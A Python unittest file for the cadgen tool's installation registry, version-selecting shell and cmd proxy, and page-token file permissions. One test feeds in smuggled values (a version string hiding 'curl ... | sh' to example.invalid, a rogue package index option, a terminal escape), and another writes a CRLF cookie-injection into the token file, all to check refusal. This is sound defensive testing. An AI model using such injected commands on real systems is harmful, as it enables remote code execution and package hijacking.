"""The installations' registry and the ``cadgen`` command that runs them
(``cadgen._internal.installations``, ``cadgen._internal.proxy``).

Each test writes into temporary folders from fake environments; none touches ~/.local/bin or the
user's state folder, and no engine runs: the running engines the proxy asks are faked.
"""

from __future__ import annotations

import json
import os
import subprocess
import unittest
from pathlib import Path
from tempfile import TemporaryDirectory
from unittest import mock

from tests.python.support.paths import add_repo_path

add_repo_path("packages/cadgen/src")

from cadgen._internal import installations, proxy  # noqa: E402
from cadgen.engine.registry import Folder, Registry  # noqa: E402
from cadgen._internal import engine_host  # noqa: E402
from cadgen.mcp import host  # noqa: E402

POSIX = unittest.skipIf(os.name == "nt", "the proxy is an sh script on POSIX")


class Fixture(unittest.TestCase):
    def setUp(self) -> None:
        scratch = TemporaryDirectory()
        self.addCleanup(scratch.cleanup)
        self.root = Path(scratch.name).resolve()
        self.state = Folder(self.root / "state")

    def environment(self, name: str) -> tuple[str, str, str]:
        """A fake environment's console script, python and prefix."""
        scripts = self.root / name / "bin"
        scripts.mkdir(parents=True)
        console, python = scripts / "cadgen", scripts / "python"
        for path in (console, python):
            path.write_text("", encoding="utf-8")
        return str(console), str(python), str(self.root / name)

    def registered(self, version: str) -> dict:
        installations.register(version, self.environment(f"env-{version}"), self.state)
        (record,) = [found for found in installations.records(self.state) if found["version"] == version]
        return record


class RegistryTests(Fixture):
    def test_a_record_names_the_installation_and_is_rewritten_only_when_it_moves(self) -> None:
        found = self.environment("env")
        path, status = installations.register("1.2.3", found, self.state)
        self.assertEqual((Path(path), status), (self.root / "state/installations/1.2.3.json", installations.REGISTERED))
        record = json.loads(Path(path).read_text(encoding="utf-8"))
        self.assertEqual({key: record[key] for key in ("version", "cadgen", "python", "prefix")},
                         {"version": "1.2.3", "cadgen": found[0], "python": found[1], "prefix": found[2]})
        self.assertIn("registered", record)
        self.assertEqual(installations.register("1.2.3", found, self.state)[1], installations.OK)
        moved = self.environment("moved")  # the same version installed again elsewhere (a purged uv cache)
        self.assertEqual(installations.register("1.2.3", moved, self.state)[1], installations.REGISTERED)
        self.assertEqual(installations.records(self.state)[0]["python"], moved[1])

    def test_an_upgrade_in_place_takes_over_its_environment_s_record(self) -> None:
        found = self.environment("tool")
        installations.register("0.8.0", found, self.state)
        installations.register("0.8.1", found, self.state)  # the same environment, upgraded
        self.registered("0.7.0")
        self.assertEqual(sorted(record["version"] for record in installations.records(self.state)), ["0.7.0", "0.8.1"],
                         "0.8.0's code is gone from it: `cadgen +0.8.0` must not run 0.8.1")

    def test_prune_removes_only_records_whose_interpreter_is_gone(self) -> None:
        gone, live = self.registered("1.0.0"), self.registered("2.0.0")
        os.unlink(gone["python"])
        self.assertEqual(installations.prune(self.state), [gone["path"]])
        self.assertEqual([record["version"] for record in installations.records(self.state)], ["2.0.0"])
        self.assertTrue(Path(live["path"]).is_file())

    def test_a_source_tree_registers_nothing_unless_named(self) -> None:
        # These tests import cadgen from the checkout: the release's version is not theirs to register.
        with mock.patch.dict("os.environ", {installations.NAME_ENV: "", "CADGEN_STATE_DIR": str(self.root / "state")}):
            self.assertIsNone(installations.own_version())
        with mock.patch.dict("os.environ", {installations.NAME_ENV: "1.2.3-dev.4"}):
            self.assertEqual(installations.own_version(), "1.2.3-dev.4")

    def test_an_environment_runs_as_the_version_it_is_registered_as(self) -> None:
        """``python model.py`` run directly in a registered development environment, no variable set:
        its client, engine and workers go by the record's version (one door with the dev MCP server's
        engine), never the bare release that would outrank it. Unregistered: the release. The variable
        still wins, and a record of another release (an upgrade in place since) is not this code's."""
        import sys

        from cadgen.engine import daemon, previous

        release = previous.version()
        dev = f"{release}-dev.20261025032333"
        here = (str(self.root / "c"), str(self.root / "p"), sys.prefix)
        with mock.patch.dict("os.environ", {"CADGEN_STATE_DIR": str(self.root / "state")}):
            os.environ.pop(installations.NAME_ENV, None)
            self.assertEqual(daemon.installation(), release, "unregistered: the release")
            installations.register("0.0.1-dev.1", here)  # another release's record of this environment
            self.assertEqual(daemon.installation(), release)
            installations.register(dev, here)
            self.assertEqual((daemon.installation(), installations.own_version()), (dev, dev))
            door = daemon._tag()
            os.environ[installations.NAME_ENV] = dev
            self.assertEqual(daemon._tag(), door, "the same door as the engine the variable names")
            os.environ[installations.NAME_ENV] = "9.9.9"
            self.assertEqual((daemon.installation(), installations.own_version()), ("9.9.9", "9.9.9"))

    def test_only_the_cad_apps_server_and_doctor_write(self) -> None:
        from cadgen import cli
        from cadgen.mcp import shim

        found = self.environment("env")
        named = {installations.NAME_ENV: "1.2.3", installations.DIR_ENV: str(self.root / "bin"),
                 "CADGEN_STATE_DIR": str(self.root / "state")}
        with mock.patch.dict("os.environ", named), mock.patch.object(installations, "targets", return_value=found):
            with mock.patch.object(cli, "_run", return_value=0), mock.patch.object(cli, "_tell"):
                self.assertEqual(cli._main(["status"]), 0)
            self.assertFalse((self.root / "bin").exists())
            self.assertEqual(installations.records(), [])
            shim.start()
            self.assertEqual([record["version"] for record in installations.records()], ["1.2.3"])
            self.assertEqual(installations.proxy_status(), installations.OK)

    def test_a_folder_it_cannot_write_is_skipped_silently(self) -> None:
        from cadgen.mcp import shim

        blocked = self.root / "a-file"
        blocked.write_text("", encoding="utf-8")
        path, status, error = installations.write_proxy(str(blocked / "bin"))
        self.assertTrue(error)
        named = {installations.NAME_ENV: "1.2.3", installations.DIR_ENV: str(blocked / "bin"),
                 "CADGEN_STATE_DIR": str(blocked / "state")}
        with mock.patch.dict("os.environ", named), mock.patch.object(installations, "targets",
                                                                     return_value=self.environment("env")):
            shim.start()  # the server says nothing and raises nothing
            (_, _, unregistered), (_, _, unwritten) = installations.setup("1.2.3")
        self.assertTrue(unregistered and unwritten)


class ProxyFileTests(Fixture):
    def test_the_proxy_is_written_once_and_a_file_not_cadgens_is_left_alone(self) -> None:
        where = str(self.root / "bin")
        self.assertEqual(installations.write_proxy(where, windows=False)[1:], (installations.MISSING, None))
        path = installations.proxy_path(where, windows=False)
        self.assertEqual(Path(path).read_text(encoding="utf-8"), installations.script(False))
        self.assertTrue(os.access(path, os.X_OK))
        self.assertEqual(installations.write_proxy(where, windows=False)[1], installations.OK)
        Path(path).write_text(installations.script(False).replace("exit 1", "exit 2"), encoding="utf-8")
        self.assertEqual(installations.write_proxy(where, windows=False)[1], installations.STALE)
        later = installations.script(False).replace(f"{installations.MARK}{installations.REVISION}",
                                                    f"{installations.MARK}{installations.REVISION + 1}")
        Path(path).write_text(later, encoding="utf-8")
        self.assertEqual(installations.write_proxy(where, windows=False)[1], installations.NEWER)
        self.assertEqual(Path(path).read_text(encoding="utf-8"), later)
        Path(path).write_text("#!/bin/sh\nexec uv-tool-cadgen\n", encoding="utf-8")  # a person's own
        self.assertEqual(installations.write_proxy(where, windows=False)[1], installations.FOREIGN)
        self.assertEqual(Path(path).read_text(encoding="utf-8"), "#!/bin/sh\nexec uv-tool-cadgen\n")

    def test_the_windows_proxy_is_a_cmd_with_the_same_marker(self) -> None:
        text = installations.script(True)
        self.assertIn(f"rem {installations.MARK}{installations.REVISION}\r\n", text)
        self.assertIn("-P -m cadgen._internal.proxy %*", text)
        installations.write_proxy(str(self.root / "bin"), windows=True)
        self.assertTrue((self.root / "bin" / "cadgen.cmd").is_file())

    def test_the_cmd_takes_the_python_from_its_record_line(self) -> None:
        # No Windows here to run it: for /f's split is simulated. With delims=" a run of quotes is
        # one delimiter and none starts the line, so the line's leading space is token 1.
        import re

        python = "C:\\Users\\a b\\AppData\\Local\\uv\\env\\Scripts\\python.exe"
        path, _status = installations.register("1.2.3", (python[:-10] + "cadgen.exe", python, "C:\\env"), self.state)
        text = installations.script(True)
        tokens, delimiter, needle = re.search(r'tokens\^=(\d+)\^ delims\^=\^(.) %%p in \(`findstr /c:"((?:\\"|[^"])*)" ',
                                              text).groups()
        needle = needle.replace('\\"', '"')  # findstr's escaped quote
        (line,) = [line for line in Path(path).read_text(encoding="utf-8").splitlines() if needle in line]
        fields = [field for field in line.split(delimiter) if field]
        found = fields[int(tokens) - 1]
        self.assertEqual(found.replace("\\\\", "\\"), python, "the cmd's !python:\\\\=\\! unescapes JSON's backslashes")
        self.assertIn("!python:\\\\=\\!", text)

    @POSIX
    def test_the_sh_runs_the_installation_registered_last_and_names_a_missing_version(self) -> None:
        where = str(self.root / "bin")
        installations.write_proxy(where, windows=False)
        proxy_file = installations.proxy_path(where, windows=False)
        environment = {"PATH": os.environ.get("PATH", ""), "HOME": str(self.root), "CADGEN_STATE_DIR": str(self.root / "state")}
        missing = subprocess.run([proxy_file, "+9.9.9", "status"], capture_output=True, text=True, env=environment)
        self.assertEqual(missing.returncode, 1)
        self.assertEqual(missing.stderr.strip(), proxy.NOT_INSTALLED.format(version="9.9.9"))
        # None installed: the sh and the proxy say it in one wording, the command that installs it.
        none = subprocess.run([proxy_file, "status"], capture_output=True, text=True, env=environment)
        self.assertEqual((none.returncode, none.stderr.strip()), (1, proxy.NONE_INSTALLED))
        with self.assertRaises(proxy.Refused) as refused:
            proxy.choose(None, [], list, None)
        self.assertEqual(str(refused.exception), "cadgen is not installed: run `uvx --no-config --managed-python "
                                                 "--python 3.13 --from cadgen cadgen doctor` once, outside any "
                                                 "sandbox or with its permission")
        for version in ("1.0.0", "2.0.0"):
            record = self.registered(version)
            Path(record["python"]).write_text(f'#!/bin/sh\necho "{version}" "$@"\n', encoding="utf-8")
            os.chmod(record["python"], 0o755)
        os.utime(self.root / "state/installations/2.0.0.json", (1, 1))  # 1.0.0 registered last
        ran = subprocess.run([proxy_file, "+2.0.0", "a b"], capture_output=True, text=True, env=environment,
                             cwd=self.root)
        self.assertEqual(ran.stdout, "1.0.0 -P -m cadgen._internal.proxy +2.0.0 a b\n")


    def test_the_windows_proxy_reads_the_python_and_the_cadgen_a_record_names(self) -> None:
        # No Windows runner executes the cmd: each for /f is checked against the record's own line.
        # With delims set to a quote alone, cmd skips empty pieces and keeps the indent as one.
        import re

        record = self.registered("1.0.0")
        lines = Path(record["path"]).read_text(encoding="utf-8").splitlines()
        text = installations.script(True)
        reads = re.findall(r'tokens\^=(\d+)\^ delims\^=\^" %%(\w) in \(`findstr /c:"\\"(\w+)\\":" '
                           r'"!state!\\installations\\%%n"`\) do set "(\w+)=%%\2"', text)
        self.assertEqual(sorted((key, name) for _taken, _letter, key, name in reads),
                         [("cadgen", "console"), ("python", "python")])
        for taken, _letter, key, _name in reads:
            (line,) = [row for row in lines if f'"{key}":' in row]
            pieces = [piece for piece in line.split('"') if piece]
            self.assertEqual(pieces[int(taken) - 1].replace("\\\\", "\\"), record[key])
        # Alive as alive() says it, as the sh does: an uninstalled cadgen leaves its python.
        self.assertIn('if exist "!python!" if exist "!console!" goto run', text)
        self.assertEqual(text.count("goto run"), 1)

    @POSIX
    def test_the_sh_passes_over_an_installation_whose_cadgen_is_gone(self) -> None:
        where = str(self.root / "bin")
        installations.write_proxy(where, windows=False)
        environment = {"PATH": os.environ.get("PATH", ""), "HOME": str(self.root), "CADGEN_STATE_DIR": str(self.root / "state")}
        for version in ("1.0.0", "2.0.0"):
            record = self.registered(version)
            Path(record["python"]).write_text(f'#!/bin/sh\necho "{version}"\n', encoding="utf-8")
            os.chmod(record["python"], 0o755)
        os.utime(self.root / "state/installations/1.0.0.json", (1, 1))  # 2.0.0 registered last...
        os.remove(record["cadgen"])  # ...and uninstalled from its environment: its python stays
        ran = subprocess.run([installations.proxy_path(where, windows=False), "status"], capture_output=True,
                             text=True, env=environment, cwd=self.root)
        self.assertEqual(ran.stdout, "1.0.0\n", ran.stderr)


class ResolutionTests(Fixture):
    def setUp(self) -> None:
        super().setUp()
        self.old, self.new, self.dev = self.registered("0.8.0"), self.registered("0.9.0"), self.registered("0.9.0-dev.20261024")
        self.records = installations.records(self.state)

    def choose(self, args: list[str], environ: dict | None = None,
               engines: list[dict] | None = None, shell: str | None = None) -> tuple[str, list[str]]:
        asked = []

        def running() -> list[dict]:
            asked.append(True)
            return engines or []

        version, rest = proxy.named(args, environ or {})
        record = proxy.choose(version, self.records, running, shell)
        if version is not None:
            self.assertFalse(asked, "a version named asks no engine")
        return record["version"], rest

    def engine(self, record: dict, **hosts: int) -> dict:
        return {"ok": True, "prefix": record["prefix"], "hosts": {name.replace("_", " "): count for name, count in hosts.items()}}

    def test_a_the_first_argument_names_the_version(self) -> None:
        self.assertEqual(self.choose(["+0.8.0", "export", "a.xbf"], {"CADGEN_VERSION": "0.9.0"}), ("0.8.0", ["export", "a.xbf"]))

    def test_b_then_cadgen_version(self) -> None:
        self.assertEqual(self.choose(["status"], {"CADGEN_VERSION": "0.8.0"}), ("0.8.0", ["status"]))

    def test_c_then_the_running_engine_this_hosts_server_holds(self) -> None:
        engines = [self.engine(self.new, claude_code=1), self.engine(self.old, codex=2)]
        self.assertEqual(self.choose(["status"], engines=engines, shell="codex")[0], "0.8.0")
        self.assertEqual(self.choose(["status"], engines=engines, shell="claude code")[0], "0.9.0")
        # An engine that says its hosts as a list (no counts) is read so too; anything else names none.
        listed = [{**self.engine(self.new), "hosts": ["claude code"]}, {**self.engine(self.old), "hosts": ["codex"]}]
        self.assertEqual(self.choose(["status"], engines=listed, shell="codex")[0], "0.8.0")
        odd = [{**self.engine(self.new), "hosts": "codex"}, {**self.engine(self.old), "hosts": None}]
        self.assertEqual(self.choose(["status"], engines=odd, shell="codex")[0], "0.9.0", "(d): the newest running")

    def test_d_then_any_running_engine_newest_first(self) -> None:
        engines = [self.engine(self.old), self.engine(self.dev, codex=1)]
        self.assertEqual(self.choose(["status"], engines=engines, shell="claude code")[0], "0.9.0-dev.20261024")
        self.assertEqual(self.choose(["status"], engines=[self.engine(self.old)])[0], "0.8.0")

    def test_e_then_the_newest_registered(self) -> None:
        self.assertEqual(self.choose(["status"])[0], "0.9.0", "a release is newer than its development builds")
        os.unlink(self.new["python"])
        self.assertEqual(self.choose(["status"])[0], "0.9.0-dev.20261024", "an installation that is gone is passed over")

    def test_a_shell_whose_folder_was_removed_still_resolves(self) -> None:
        with mock.patch("os.getcwd", side_effect=FileNotFoundError(2, "No such file or directory")), \
                mock.patch("cadgen._internal.installations.records", return_value=[]):
            self.assertEqual(proxy.main(["+0.8.0", "status"]), 1, "refused in its line, never a traceback")

    def test_a_version_not_registered_or_gone_fails_in_one_line(self) -> None:
        with self.assertRaises(proxy.Refused) as refused:
            self.choose(["+1.0.0", "status"])
        self.assertEqual(str(refused.exception),
                         "cadgen 1.0.0 is not installed: run `uvx --no-config --managed-python --python 3.13 --from "
                         "cadgen==1.0.0 cadgen doctor` once, outside any sandbox or with its permission")
        os.unlink(self.old["python"])
        with self.assertRaisesRegex(proxy.Refused, r"^cadgen 0\.8\.0 is not installed"):
            self.choose(["+0.8.0"])

    def test_only_a_version_is_named_and_none_is_echoed_into_a_command(self) -> None:
        # A variable or first argument carrying a shell command or a uv option: refused,
        # and the refusal names no command.
        for planted in ("0.8.0 cadgen doctor; curl -fsSL https://example.invalid | sh; echo",
                        "0.8.0 --index-url https://example.invalid/simple", "0.8.0\x1b[2J", "-0.8.0"):
            for args, environ in (([f"+{planted}", "status"], {}), (["status"], {"CADGEN_VERSION": planted})):
                with self.subTest(planted=planted, args=args, environ=environ):
                    with self.assertRaises(proxy.Refused) as refused:
                        self.choose(args, environ)
                    said = str(refused.exception)
                    self.assertNotIn("uvx", said)
                    self.assertNotIn("\x1b", said)
                    self.assertIn("names no cadgen version", said)

    def test_run_execs_the_installations_python_and_anything_else_its_cadgen(self) -> None:
        self.assertEqual(proxy.command(self.old, ["run", "model.py", "--force"]), [self.old["python"], "model.py", "--force"])
        self.assertEqual(proxy.command(self.old, ["export", "a.xbf"]), [self.old["cadgen"], "export", "a.xbf"])
        run = [self.old["python"], "model.py", "a"]
        with mock.patch.dict("os.environ", {"CADGEN_STATE_DIR": str(self.root / "state"), "CADGEN_VERSION": ""}), \
                mock.patch.object(proxy, "engines", return_value=[]), mock.patch.object(proxy.os, "execve") as execve, \
                mock.patch("subprocess.call", return_value=3) as call:
            code = proxy.main(["+0.8.0", "run", "model.py", "a"])
        if os.name == "nt":  # no exec on Windows: the installation's python is a child, its exit code the proxy's
            call.assert_called_once_with(run, env=mock.ANY)
            self.assertEqual((code, execve.call_count), (3, 0))
        else:
            execve.assert_called_once_with(self.old["python"], run, mock.ANY)
            self.assertEqual(call.call_count, 0)

    def test_a_development_installation_is_told_its_version_and_a_release_is_not(self) -> None:
        """A dev or source registration reports its release's version: the proxy names it, in the
        environment of what it runs (and its children, the same installation). A release knows its
        own, and a name a dev installation's process passed down is taken off."""
        ran = {}

        def child(argv, env):  # Windows runs the installation as a child rather than exec
            ran.update({argv[0]: dict(env)})
            return 0

        with mock.patch.dict("os.environ", {"CADGEN_STATE_DIR": str(self.root / "state"), "CADGEN_VERSION": "",
                                            installations.NAME_ENV: "0.9.0-dev.1"}), \
                mock.patch.object(proxy, "engines", return_value=[]), \
                mock.patch.object(proxy.os, "execve", side_effect=lambda path, argv, env: ran.update({path: dict(env)})), \
                mock.patch("subprocess.call", side_effect=child):
            proxy.main(["+0.9.0-dev.20261024", "doctor"])
            proxy.main(["+0.8.0", "doctor"])
        self.assertEqual(ran[self.dev["cadgen"]][installations.NAME_ENV], "0.9.0-dev.20261024")
        self.assertNotIn(installations.NAME_ENV, ran[self.old["cadgen"]])
        self.assertEqual([installations.named(record) for record in (self.old, self.new, self.dev)],
                         [None, None, "0.9.0-dev.20261024"])

    def test_the_shell_names_its_host(self) -> None:
        self.assertEqual(engine_host.shell({"CODEX_THREAD_ID": "t", "CLAUDECODE": "1"}), "codex")
        self.assertEqual(engine_host.shell({"CLAUDECODE": "1"}), "claude code")
        self.assertIsNone(engine_host.shell({}))
        self.assertEqual(host.family({"host": "codex app-server"}), "codex")
        self.assertEqual(host.family({"host": "claude code"}), "claude code")
        self.assertIsNone(host.family(None))


class TokenTests(unittest.TestCase):
    def test_the_page_token_is_one_file_the_users_alone(self) -> None:
        import re

        with TemporaryDirectory() as scratch:
            held = Registry(scratch)
            self.assertIsNone(held.token())
            held.put_token("t" * 43)
            self.assertEqual(held.token(), "t" * 43)
            path = Path(scratch) / "engines" / "token"
            if os.name != "nt":
                self.assertEqual(path.stat().st_mode & 0o777, 0o600)
            path.write_bytes(b"short\n")
            with self.assertRaisesRegex(ValueError, rf"^the page token {re.escape(str(path))} holds no token "
                                                    r"\(6 bytes\): remove it to make a new one"):
                held.token()  # a token too short to guard anything is refused, never taken for none
            path.write_text("t" * 40 + "\r\nSet-Cookie: x=y\n", encoding="utf-8")
            with self.assertRaisesRegex(ValueError, rf"^the page token {re.escape(str(path))} holds no token"):
                held.token()  # only a token's characters: it goes into a cookie
            held.put_token("u" * 43)
            if os.name != "nt":
                os.chmod(path, 0o644)  # readable by others, as in a state folder others share
                with self.assertRaisesRegex(ValueError, rf"^the page token {re.escape(str(path))} is not this "
                                                        r"user's alone \(mode 0644\)"):
                    held.token()  # a token others can read guards nothing, and is never served
                os.chmod(path, 0o600)
                with mock.patch("os.getuid", return_value=os.getuid() + 1):
                    with self.assertRaisesRegex(ValueError, r"is not this user's alone \(mode 0600, owned by uid"):
                        held.token()  # another user's token file is not this user's token
            self.assertEqual(held.token(), "u" * 43)
            self.assertEqual(path.read_text(encoding="utf-8"), "u" * 43 + "\n", "refused, never replaced")

    def test_the_first_engine_makes_the_token_and_another_starting_with_it_serves_that_one(self) -> None:
        from cadgen.engine import daemon

        with TemporaryDirectory() as scratch:
            held = Registry(scratch)
            self.assertTrue(held.make_token("a" * 43))
            self.assertFalse(held.make_token("b" * 43), "never made over one that is there")
            self.assertEqual(held.token(), "a" * 43)
            if os.name != "nt":
                self.assertEqual((Path(scratch) / "engines" / "token").stat().st_mode & 0o777, 0o600)
            # An engine that found none, then lost the making to this one: it serves this one's.
            self.assertEqual(daemon._new_token(held), "a" * 43)
            self.assertEqual(held.token(), "a" * 43)
            self.assertEqual(os.listdir(Path(scratch) / "engines"), ["token"], "nothing of its own left beside it")

    @unittest.skipIf(os.name == "nt" or (hasattr(os, "geteuid") and os.geteuid() == 0),
                     "a file's mode is POSIX's, and refuses no one running as root")
    def test_a_token_that_cannot_be_read_is_refused_by_name_and_never_replaced(self) -> None:
        import re

        from cadgen.engine import daemon

        with TemporaryDirectory() as scratch:
            held = Registry(scratch)
            held.put_token("a" * 43)
            path = Path(scratch) / "engines" / "token"
            path.chmod(0)
            try:
                for call in (held.token, lambda: daemon._new_token(held)):
                    with self.assertRaisesRegex(ValueError, rf"^the page token {re.escape(str(path))} cannot be read "
                                                            r"\(Permission denied, mode 0000\): make it this user's"):
                        call()
            finally:
                path.chmod(0o600)
            self.assertEqual(path.read_text(encoding="utf-8"), "a" * 43 + "\n", "left as it was: every link still works")


if __name__ == "__main__":
    unittest.main()
